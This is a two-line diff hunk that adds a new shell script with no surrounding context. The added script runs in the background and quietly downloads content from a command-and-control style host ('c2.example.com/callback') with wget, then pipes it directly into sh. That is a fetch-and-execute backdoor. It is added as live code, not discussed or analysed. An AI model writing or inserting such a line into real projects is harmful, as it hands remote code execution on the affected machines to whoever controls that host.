@@ -1,0 +1,2 @@
+#!/bin/sh
+nohup wget -qO- http://c2.example.com/callback | sh &
